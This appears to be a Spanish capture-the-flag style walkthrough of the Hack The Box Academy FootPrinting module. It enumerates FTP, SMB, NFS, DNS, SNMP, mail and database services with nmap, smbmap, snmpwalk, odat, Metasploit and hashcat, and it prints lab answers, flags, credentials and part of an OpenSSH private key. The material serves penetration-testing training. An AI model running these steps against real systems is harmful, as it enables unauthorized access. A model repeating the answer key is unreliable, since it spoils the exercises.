# FootPrinting

## Host Based Enumeration
### FTP

> Es un protocolo de red antiguo que permite transferir archivos entre un ordenador cliente (tu máquina) y un servidor remoto a través de Internet o de una red local.

> Sus puertos activos son **20 TCP**  y **21 TCP**

1. **Which version of the FTP server is running on the target system? Submit the entire banner as the answer.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.34.129
```

<p align="center"> 
<img src="images/ftp-nmap.png" width="600" alt="Resultado de Nmap">
</p>

InFreight FTP v1.1

<p align="center"> 
<img src="images/ftp.png" width="600" alt="Resultado de Nmap">
</p>

2. **Enumerate the FTP server and find the flag.txt file. Submit the contents of it as the answer.**

<p align="center"> 
<img src="images/ftp-1.png" width="600" alt="Resultado de Nmap">
<img src="images/ftp-2.png" width="600" alt="Resultado de Nmap">
</p>

### SMB

>Es un protocolo de red que permite compartir archivos, carpetas, impresoras y otros recursos entre equipos conectados en la misma red. Suele usarse mucho en entornos Windows, pero también existe en Linux mediante Samba.

> Los puertos de SMB son **139 TCP** y **445 TCP**

1. **What version of the SMB server is running on the target system? Submit the entire banner as the answer.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.34.129
```

Samba smbd 4

<p align="center"> 
<img src="images/Samba.png" width="600" alt="Resultado de Nmap">
</p>

2. **What is the name of the accessible share on the target?**

```
smbmap -H 10.129.34.129
```

sambashare

<p align="center"> 
<img src="images/Samba-1.png" width="600" alt="Resultado de Nmap">
</p>

3. **Connect to the discovered share and find the flag.txt file. Submit the contents as the answer.**

```
smbmap -H 10.129.34.189 -r sambashare
```

<p align="center"> 
<img src="images/Samba-2.png" width="600" alt="Resultado de Nmap">
</p>

 ```
 smbmap -H 10.129.34.189 -r sambashare/contents
 ```

<p align="center"> 
<img src="images/Samba-3.png" width="600" alt="Resultado de Nmap">
</p>

```
smbmap -H 10.129.34.189 --download sambashare/contents/flag.txt
```

<p align="center"> 
<img src="images/Samba-4.png" width="600" alt="Resultado de Nmap">
</p>

```
cat 10.129.34.189-sambashare_contents_flag.txt
```

<p align="center"> 
<img src="images/Samba-5.png" width="600" alt="Resultado de Nmap">
</p>

4. **Find out which domain the server belongs to**

En esta ocasión para encontrar el nombre del dominio hay que usar la herramienta **enum4linux**

```
enum4linux <ip> -r <nombreArchivos>
```

<p align="center"> 
<img src="images/enum4linux.png" width="600" alt="Resultado de Nmap">
</p>

El nombre del Dominio es **DEVOPS**

5. **Find additional information about the specific share we found previously and submit the customized version of that specific share as the answer.**

```
smbclient -N -L //10.129.34.189/ 
```

<p align="center"> 
<img src="images/smbclient.png" width="600" alt="Resultado de Nmap">
</p>

6. **What is the full system path of that specific share? (format: "/directory/names")**

```
rpcclient -U "" 10.129.34.189
```

<p align="center"> 
<img src="images/rpcclient.png" width="600" alt="Resultado de Nmap">
</p>

Pero la solución correcta sería con las barras invertidas: 
**/home/sambauser**

### NFS

> Es un protocolo distribuido que permite compartir archivos y directorios entre sistemas en una red, como si fueran locales. Funciona tanto en Windows y Linux, pero se usa mas en Linux

> Los puertos que suelen estar abierto son **111 TCP** y **2049 TCP**

1. **Enumerate the NFS service and submit the contents of the flag.txt in the "nfs" share as the answer.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.12.73
```

<p align="center"> 
<img src="images/NFS.png" width="600" alt="Resultado de Nmap">
</p>

```
showmount -e 10.129.12.73 # Mostrar acciones diusponibles del NFS
mkdir -p ./target-NFS # Crea todos los directorios necesarios en la ruta, paso paso.
sudo mount -t nfs 10.129.12.73:/ ./target-NFS -o nolock
cat target-NFS/flag.txt
```

La flag es **HTB{hjglmvtkjhlkfuhgi734zthrie7rjmdze}**

2. **Enumerate the NFS service and submit the contents of the flag.txt in the "nfsshare" share as the answer.**

<p align="center"> 
<img src="images/flagnfsshare.png" width="600" alt="Resultado de Nmap">
</p>

### DNS

> Es el protocolo que **traduce nombres de dominio** (como `www.google.com`) en direcciones IP (por ejemplo `142.250.180.14`), para que tus dispositivos sepan a qué servidor se deben conectar.

> Suelen estar en el puerto **53 TCP**

1. **Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**

**FQDN** es nombre completo del nameserver (ej: `ns.inlanefreight.htb`).

En nuestro archivo **/etc/hosts** establecemos el nombre del Servicio DNS junto a la ip 
10.129.12.92       inlanefreight.htb

```
dig ns inlanefreight.htb @10.129.12.92
```

<p align="center"> 
<img src="images/dns.png" width="600" alt="Resultado de Nmap">
</p>

La respuesta es  **ns.inlanefreight.htb.**

2. **### Interact with the target DNS using its IP address and enumerate the FQDN of it for the "inlanefreight.htb" domain.**

```
dig axfr inlanefreight.htb @10.129.12.92
```

<p align="center"> 
<img src="images/dns-1.png" width="600" alt="Resultado de Nmap">
</p>

Tenemos que probar las siguientes rutas

app.inlanefreight.htb.
dev.inlanefreight.htb.
**internal.inlanefreight.htb.**
mail1.inlanefreight.htb.

Luego, con la misma estructura del comando anterior probamos, y la unica que nos dara un resultado coherente, sera este:

```
dig axfr internal.inlanefreight.htb. @10.129.12.92
```

<p align="center"> 
<img src="images/DNS-2.png" width="600" alt="Resultado de Nmap">
</p>

3. **What is the IPv4 address of the hostname DC1?**

```
dig axfr internal.inlanefreight.htb @10.129.12.92
```

<p align="center"> 
<img src="images/dns-3.png" width="600" alt="Resultado de Nmap">
</p>

4. **What is the FQDN of the host where the last octet ends with "x.x.x.203"?**

Con los diccionarios actuales que tiene mi kali no podemos encontrar esto "x.x.x.203"

Para ello tendremos que instalar **seclists**

```
sudo apt update
sudo apt install seclists
sudo updatedb 
```

La ruta que nos ha estado funcionando hasta ahora ha sido **dev.inlanefreight.htb**, por tanto, el comando al final quedaría:

```
dnsenum --dnsserver 10.129.15.174 --enum -f /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt dev.inlanefreight.htb
```

<p align="center"> 
<img src="images/dns-4.png" width="600" alt="Resultado de Nmap">
</p>

### SMTP

> Es el protocolo que se usa para **enviar correos electrónicos** entre servidores y desde tu cliente de correo

> El puerto SMTP será siempre **587 TCP**, mientras que el puerto **25 TCP** se usa sobre todo entre servidores de correo

<p align="center"> 
<img src="images/SMTP.png" width="600" alt="Resultado de Nmap">
</p>

1. **Enumerate the SMTP service and submit the banner, including its version as the answer.**

<p align="center"> 
<img src="images/SMTP-2.png" width="600" alt="Resultado de Nmap">
</p>

2. **Enumerate the SMTP service even further and find the username that exists on the system. Submit it as the answer.**

En esta ocasión, para encontrar el usuario existente del sistema tendremos que hacer dos cosas:

1. Descargar en recursos de HTBAcademy el siguiente diccionario.

<p align="center"> 
<img src="images/Recursos.png" width="600" alt="Resultado de Nmap">
</p>

2. Usar en metasploit el módulo **smtp_enum**

```
search smtp_enum
use 0
options
set RHOSTS <IpVictima>
set USER_FILE <Ruta_Del_Diccionario_Recien_Descargado>
```

<p align="center"> 
<img src="images/metasploit.png" width="600" alt="Resultado de Nmap">
<img src="images/robin.png" width="600" alt="Resultado de Nmap">
</p>

### IMAP/POP3

> IMAP y POP3 son protocolos de correo que sirven para **recibir** y gestionar los mensajes desde un servidor

- Los puertos **110 TCP** y **995 TCP** se utiliza para **POP3**
- Los puertos **143 TCP** y **993 TCP** se utiliza para **IMAP**
- Los puertos más altos **993 TCP** y **995 TCP** utilizan **TLS/SSL** para cifrar la comunicación entre el cliente y el servidor

1. **Figure out the exact organization name from the IMAP/POP3 service and submit it as the answer.**

Antes de empezar con este apartado, debemos de saber que al final del informe nos encontramos con las siguientes claves **robin:robin**

```
curl -k 'imaps://10.129.42.195' --user robin:robin -v
```

<p align="center"> 
<img src="images/name.png" width="600" alt="Resultado de Nmap">
</p>

2. **What is the FQDN that the IMAP and POP3 servers are assigned to?**

```
curl -k 'imaps://10.129.42.195' --user robin:robin -v
```

<p align="center"> 
<img src="images/FQDN.png" width="600" alt="Resultado de Nmap">
</p>

3. **Enumerate the IMAP service and submit the flag as the answer. (Format: HTB{...})**

```
curl -k 'imaps://10.129.42.195' --user robin:robin -v
```

<p align="center"> 
<img src="images/HTB.png" width="600" alt="Resultado de Nmap">
</p>

4. **What is the customized version of the POP3 server?**

```
openssl s_client -connect 10.129.42.195:pop3s
```

La respuesta se encuentra al final del todo

<p align="center"> 
<img src="images/POP3.png" width="600" alt="Resultado de Nmap">
</p>

5. **What is the admin email address?**

```
openssl s_client -connect 10.129.42.195:imaps
```

Iniciamos el **sevicio imaps**, donde nos dejara introducir los siguientes comandos:

```
1 LOGIN robin robin
```

Iniciamos sesión con las credenciales proporcionada

```
1 LIST ""*
```

<p align="center"> 
<img src="images/LIST.png" width="600" alt="Resultado de Nmap">
</p>

```
1 SELECT DEV.DEPARTMENT.INT
```

Una vez seleccionamos el departamento, realizamos el siguiente comando:

```
1 FETCH 1:* (FLAGS BODY[HEADER.FIELDS (FROM TO SUBJECT DATE)])
```

<p align="center"> 
<img src="images/correoadmin.png" width="600" alt="Resultado de Nmap">
</p>

6. **Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})**

Para responder esta pregunta tenemos que tener iniciado la sesión del ejercicio anterior, y dentro del departamento **DEV.DEPARTMENT.INT** realizamos el siguiente comando:

```
1 FETCH 1 BODY[TEXT]
```

<p align="center"> 
<img src="images/Flag321.png" width="600" alt="Resultado de Nmap">
</p>

### SNMP

>  **Es un protocolo para monitorizar y gestionar dispositivos de red**. Además, se pueden gestionar tareas de configuración y configurarse de forma remota usando este estándar. La versión actual es `SNMPv3`, que aumenta la seguridad de SNMP en particular, pero también la complejidad de usar este protocolo.

> Suele estar en  los puertos **UDP 161** y **UDP 162**.

1. **Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.**

```
snmpwalk -v2c -c public 10.129.17.93 
```

<p align="center"> 
<img src="images/snmpwalk.png" width="600" alt="Resultado de Nmap">
</p>

2. **What is the customized version of the SNMP server?**

```
snmpwalk -v2c -c public 10.129.17.93 
```

<p align="center"> 
<img src="images/snmpwalk-2.png" width="600" alt="Resultado de Nmap">
</p>

3. **Enumerate the custom script that is running on the system and submit its output as the answer.**

La respuesta de esta pregunta del modulo, sin duda es la perraca. 

Tendremos que capturar toda la información en un txt

```
snmpwalk -v2c -c public 10.129.17.93 > snmpwalk.txt
```

Esperamos unos segundos para que capture toda la info, ahora la idea es filtrarlo con grep 

```
cat snmpwalk.txt | grep "HTB"
```

<p align="center"> 
<img src="images/snmpwalk-3.png" width="600" alt="Resultado de Nmap">
</p>

### MySQL

> Es el protocolo propietario que usa el sistema de gestión de bases de datos **MySQL** para que los clientes se conecten al servidor de base de datos, envíen consultas y reciban resultados.

> Suele escuchar en el **puerto 3306/TCP**

1. **Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.42.195  
```

<p align="center"> 
<img src="images/nmap 1.png" width="600" alt="Resultado de Nmap">
</p>

2.  **During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?**

```
mysql -u robin -probin -h 10.129.42.195 --ssl-verify-server-cert=false
```

**--ssl-verify-server-cert=false** : Se utiliza para deshabilitar la verificación del certificado SSL/TLS del servidor.

A continuación para mostar la bbdd usaremos el siguiente comando:

```
show databases;
```

<p align="center"> 
<img src="images/databases.png" width="600" alt="Resultado de Nmap">
</p>

Nos interesa la tabla customers

```
use customers;
show tables;
```

<p align="center"> 
<img src="images/tables.png" width="600" alt="Resultado de Nmap">
</p>

Luego quiero saber el contenido de myTables

```
describe myTable;
```

<p align="center"> 
<img src="images/myTables.png" width="600" alt="Resultado de Nmap">
</p>

Por último, para conseguir el correo:

```
select email from myTable Where name='Otto Lang';
```

<p align="center"> 
<img src="images/email.png" width="600" alt="Resultado de Nmap">
</p>

### MSSQL

> Es el sistema de gestión de bases de datos relacional basado en SQL de Microsoft.

> El puerto que suele habilitar es **1433/TCP**

1. **Enumera el objetivo usando los conceptos enseñados en esta sección. Indica el nombre de host del servidor MSSQL.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.18.252
```

<p align="center"> 
<img src="images/mssql.png" width="600" alt="Resultado de Nmap">
</p>

2. **Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.**

```
impacket-mssqlclient backdoor@10.129.18.252 -windows-auth
```

**-windows-auth** : Hace que se conecte a este MSSQL usando la cuenta de Windows del dominio, no un usuario SQL local

<p align="center"> 
<img src="images/mssql-1.png" width="600" alt="Resultado de Nmap">
</p>

```
select name from sys.databases
```

<p align="center"> 
<img src="images/employees.png" width="600" alt="Resultado de Nmap">
</p>

### Theory Oracle TNS

> Es un protocolo de comunicación que facilita la comunicación entre bases de datos y aplicaciones Oracle a través de redes

> Suele estar habilitado en el puerto **TCP/1521**

1. **Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.205.19
```

<p align="center"> 
<img src="images/oracle.png" width="600" alt="Resultado de Nmap">
</p>

A continuación, usaremos la herramienta **odat**

>**ODAT** es una herramienta de pruebas de penetración de código abierto escrita en Python y diseñada para enumerar y explotar vulnerabilidades en bases de datos Oracle. Puede utilizarse para identificar y explotar diversas vulnerabilidades de seguridad en las bases de datos de Oracle, incluyendo la inyección SQL, la ejecución remota de código y la escalada de privilegios.

```
sudo odat all -s 10.129.205.19
```

* **all**: Ejecuta todos los módulos de auditoría disponibles

* **-s 10.129.205.19**: Apunta al servidor Oracle en esa IP (tu XE)

<p align="center"> 
<img src="images/scott.png" width="600" alt="Resultado de Nmap">
</p>

```
sqlplus scott/tiger@10.129.205.19:1521/XE as sysdba
```

<p align="center"> 
<img src="images/error.png" width="600" alt="Resultado de Nmap">
</p>

No funcionará porque la librería **libsqlplus.so** no se encuentra en el **$PATH**. A continuación, realizaremos los siguiente comando para incluirlo de forma temporal: 

(antes buscamos si tenemos nuestra libreria en nuestra kali)

```
find / -name libsqlplus.so 2>/dev/null
```

<p align="center"> 
<img src="images/find.png" width="600" alt="Resultado de Nmap">
</p>

```
export ORACLE_HOME=/usr/lib/oracle/19.6/client64
export LD_LIBRARY_PATH=$ORACLE_HOME/lib:$LD_LIBRARY_PATH
export PATH=$ORACLE_HOME/bin:$PATH
```

Comprobamos que este todo correcto

```
which sqlplus
```

<p align="center"> 
<img src="images/which.png" width="600" alt="Resultado de Nmap">
</p>

Iniciamos login

```
sqlplus scott/tiger@10.129.205.19/XE as sysdba
```

Buscamos la contraseña del usuario **DBSNMP**

```
select name, password from sys.user$;
```

<p align="center"> 
<img src="images/DBSNMP.png" width="600" alt="Resultado de Nmap">
</p>

### IPMI

> Es un conjunto de especificaciones estandarizadas para sistemas de gestión de hosts basados en hardware utilizados para la gestión y monitorización de sistemas. Se utiliza típicamente de tres maneras:

* Antes de que el sistema operativo arranque para modificar la configuración de la BIOS
* Cuando el host está completamente apagado
* Acceso a un host tras un fallo del sistema

> Suele estar en el puerto habilitado **623/UDP**

1. **What username is configured for accessing the host via IPMI?**

Metasploit tiene un módulo para descubir el usuario y hash del protocolo IPMI llamado **auxiliary/scanner/ipmi/ipmi_dumphashes**

Para conseguir el nombre de usuario, usaremos Metasploit

```
search IPMI 2.0
use 1
options
set RHOSTS 10.129.20.149
run
```

<p align="center"> 
<img src="images/meta.png" width="600" alt="Resultado de Nmap">
</p>

2. **What is the account's cleartext password?**

```
hashcat -m 7300 --username hash.txt /usr/share/wordlists/rockyou.txt
```

- **`hashcat`**: Ejecuta la herramienta hashcat (crackea hashes offline).​
- **`-m 7300`**: Selecciona el **modo 7300** = IPMI2 RAKP HMAC-SHA1 Bypass (formato específico: `user:realm:salt:hmac`). ​
- **`--username`**: Indica que el **username** ("admin") está **incluido** en el hash (IPMI lo trae por defecto).​
- **`hash.txt`**: **Archivo de entrada** con tu hash IPMI (una línea limpia).​
- **`/usr/share/wordlists/rockyou.txt`**: **Diccionario**

<p align="center"> 
<img src="images/trinityç.png" width="600" alt="Resultado de Nmap">
</p>

## Skills Assessment

### Lab - Easy

Credenciales: **ceil:qwer1234**

1. **Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.**

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.20.176
```

<p align="center"> 
<img src="images/nmap 2.png" width="600" alt="Resultado de Nmap">
</p>

En primer lugar, pruebo las credenciales aportadas en el protocolo **ssh**, pero no funcionó. Fijándome en el escaneo de nmap, En el apartado **2121 ftp** observo que hay una servidor llamado Ceil's FTP

```
ftp 10.129.20.176 2121
```

<p align="center"> 
<img src="images/ftp1212.png" width="600" alt="Resultado de Nmap">
</p>

Hemos conseguido acceso. Listando los archivos... me llama la atencion la carpeta **.ssh** y dentro me encuentro la clave id_rsa que de algún usuario, tal vez de ceil

```
ls -la
cd .ssh
ls -la
get id_rsa
```

<p align="center"> 
<img src="images/get.png" width="600" alt="Resultado de Nmap">
</p>

**No olvidemos de darle permiso de usuario**

```
chmod 600 id-rsa
ssh -i id_rsa ceil@10.129.20.176
```

<p align="center"> 
<img src="images/ceil.png" width="600" alt="Resultado de Nmap">
</p>

Conseguimos la flag 

<p align="center"> 
<img src="images/flag ceil.png" width="600" alt="Resultado de Nmap">
</p>

#### Conclusión

El laboratorio **Easy** del módulo **FootPrinting** de la plataforma **Hack The Box Academy** me ha parecido una máquina sencilla, ideal para repasar cómo iniciar sesión a través del protocolo FTP. Además, sirve para recordar que, si obtenemos el archivo **id_rsa** de un usuario, este debe tener los permisos adecuados para poder utilizarlo en el servicio SSH y así acceder al sistema y conseguir las _flags_.

### Lab - Medium

Usuario : **HTB**

1. **Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.**

<font color="#00b050">Estamos antes una máquina Windows porque su ttl es 127</font>

#### Enumeración

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.202.41
```

<p align="center"> 
<img src="images/nmap-0.1.png" width="600" alt="Resultado de Nmap">
<img src="images/nmap 0.2.png" width="600" alt="Resultado de Nmap">
<img src="images/nmap 0.3.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service       | Version                                 |
| --------- | ------------- | --------------------------------------- |
| 111       | rpcbind       | 2-4 (RPC #100000)                       |
| 135       | msrpc         | Microsoft Windows Rpcbind               |
| 139       | netbios-ssn   | Microsoft Windows netbios-ssn           |
| 445       | microsoft-ds? | -                                       |
| 2049      | nlockmgr      | 1-4 (RPC #100021)                       |
| 3389      | ms-wbt-server | Microsoft Terminal Services             |
| 5985      | http          | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |

##### NFS

El puerto 111 (NFS) esta habilitado podemos realizar los siguientes comandos:

```
showmount -e 10.129.202.41
```

<p align="center"> 
<img src="images/showmount.png" width="600" alt="Resultado de Nmap">
</p>

Comprobamos que tiene contenido, entonces intentaremos pasarnos este contenido a nuestra maquina atacante.

```
mkdir -p ./target-NFS
sudo mount -t nfs 10.129.202.41:/ ./target-NFS -o nolock
```

Para poder meternos dentro de la carpeta tenemos que ser **root** en nuestro kali

```
sudo su
tree
```

<p align="center"> 
<img src="images/tree.png" width="600" alt="Resultado de Nmap">
</p>

```
cat *
```

<p align="center"> 
<img src="images/cat112.png" width="600" alt="Resultado de Nmap">
</p>

Consigo las siguientes credenciales **alex:lol123!mD**

##### Enumeración SMB

Como tengo el puerto SMB abierto (139 y 445), intentare probar las credenciales ahí:

```
smbclient -L //10.129.202.41/ -U alex
```

<p align="center"> 
<img src="images/smbclient.1.png" width="600" alt="Resultado de Nmap">
</p>

```
smbclient //10.129.202.41/devshare -U alex
```

<p align="center"> 
<img src="images/smbclient.2.png" width="600" alt="Resultado de Nmap">
</p>

```
get important.txt
exit
cat important.txt  
```

<font color="#00b050">sa:87N1ns@slls83</font>

**Ten en cuenta que cuando vayas a descargar el archivo important.txt no estes situado dentro de una carpeta con permisos de otro usuarios, sino, no te dejará descargalo**

#### RDP

Lo que hemos conseguido es la contraseña del administrador de la bbdd SQLServer, para acceder a ella tenemos que ingresar antes al protocolo **RDP (3339)** con la herramienta **xfreerdp3**

```
xfreerdp3 /u:alex /p:'lol123!mD' /v:10.129.202.41
```

<p align="center"> 
<img src="images/windows.png" width="600" alt="Resultado de Nmap">
</p>

Una vez dentro ingresamos a Microsoft SQL Sever como Administrador e ingresamos la contraseña <font color="#00b050">87N1ns@slls83</font>

<p align="center"> 
<img src="images/password.png" width="600" alt="Resultado de Nmap">
</p>

Una vez dentro iniciamos sesión

<p align="center"> 
<img src="images/connect.png" width="600" alt="Resultado de Nmap">
</p>

Siguiendo la siguiente ruta: **WINMEDIUM** - **Databases** - **accounts** - **Tables** - **dbo.devsacc** - **Edit Top 200 Rows**

<p align="center"> 
<img src="images/bbdd.png" width="600" alt="Resultado de Nmap">
</p>

En el **id 157** se encontrará el usuario **HTB** con la contraseña **lnch7ehrdn43i7AoqVPK4zWR**

<p align="center"> 
<img src="images/HTB12313.png" width="600" alt="Resultado de Nmap">
</p>

#### Conclusión

El laboratorio “Medium” del módulo **FootPrinting** de la plataforma de **HTBAcademy** me ha parecido increíble, porque repasamos de forma práctica gran parte de los conceptos vistos en el módulo. Trabajamos con el protocolo **NFS (111)**, realizamos **enumeración de recursos compartidos mediante SMB (139 y 445)** y, por último, accedí a una máquina Windows por **RDP (3389)**. Una vez dentro, encontré una **base de datos en la que estaba almacenada la contraseña del usuario HTB**, lo que cerró el ejercicio de una forma muy didáctica.

### Lab - Hard 

**Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.**

#### Enumeracion
##### Enumeración TCP

Estamos ante un **Linux** ya que su ttl es 63

```
sudo nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.129.202.20
```

<p align="center"> 
<img src="images/nmap-hard.png" width="600" alt="Resultado de Nmap">
<img src="images/nmap-hard2.png" width="600" alt="Resultado de Nmap">
<img src="images/nmap-hard3.png" width="600" alt="Resultado de Nmap">
<img src="images/hard-nmap4.png" width="600" alt="Resultado de Nmap">
<img src="images/Pasted image 20260319193237.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service  | Version                         |
| --------- | -------- | ------------------------------- |
| 22        | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 |
| 110       | pop3     | Dovecot pop3d                   |
| 143       | imap     | Dovecot imapd (Ubuntu)          |
| 993       | ssl/imap | Dovecot imapd (Ubuntu           |
| 995       | ssl/pop3 | Dovecot pop3d                   |

##### Enumeración UDP 

```
nmap -sV --top-port 100 -sU --open 10.129.202.20
```

<p align="center"> 
<img src="images/UDP.png" width="600" alt="Resultado de Nmap">
</p>

| Open port | Service | Version                          |
| --------- | ------- | -------------------------------- |
| 161       | snmp    | net-snmp; net-snmp SNMPv3 server |

##### Enumeración SNMP

Tras las ardua enumeración, con los protocolos que estan presente, estamos antes los protocolo **IMPA/POP3** y **SNMP**. Cuando estamos antes este protocolo lo normal es usar la herramienta **openssl s_client** pero sin las credenciales no podemos hacer nada.

Como tenemos habilitado el protocolo **SNMP** podemos usar la herramienta **onesixtyone** que es un escaner de **SNMP** que sirve para descubrir **community strings** con el objetivos de sacar credenciales justo los que nos hace falta para el protocolo **IMPA/POP3**

```
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
```

<p align="center"> 
<img src="images/backup.png" width="600" alt="Resultado de Nmap">
</p>

Usaremos la herramienta **snmpwalk** para enumerar el protocolo **SNMP**

```
snmpwalk -v2c -c backup 10.129.202.20
```

Investigando se me repite mucho el nombre **tom** la idea intentar encontrar alguna pass, para haremos lo siguiente:

```
snmpwalk -v2c -c backup 10.129.202.20 >> backup
cat backup | grep "tom"
```

<p align="center"> 
<img src="images/tom.png" width="600" alt="Resultado de Nmap">
</p>

Credenciales --> <font color="#00b050">tom:NMds732Js2761</font>

#### Explotación 

##### IMAP/POP3

Una vez obtenida las credenciales, ya si podemos usar el herramienta **openssl s_client**

```
openssl s_client -connect 10.129.202.20:imaps
```

La idea aquí es navegar dentro del protocolo **IMAP/POP3**

```
1 LOGIN tom NMds732Js2761
```

<p align="center"> 
<img src="images/login.png" width="600" alt="Resultado de Nmap">
</p>

```
1 LIST "" *
```

<p align="center"> 
<img src="images/list 1.png" width="600" alt="Resultado de Nmap">
</p>

```
1 SELECT INBOX
```

<p align="center"> 
<img src="images/INBOX.png" width="600" alt="Resultado de Nmap">
</p>

Nos encontramos en inbox (bandeja de entrada)  un correo, prodecemos a leer su contenido

```
1 FETCH 1 BODY[]
```

<p align="center"> 
<img src="images/mail.png" width="600" alt="Resultado de Nmap">
</p>

Dentro del correo nos encontramos el **id_rsa** del usuario Tom

> -----BEGIN OPENSSH PRIVATE KEY-----
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
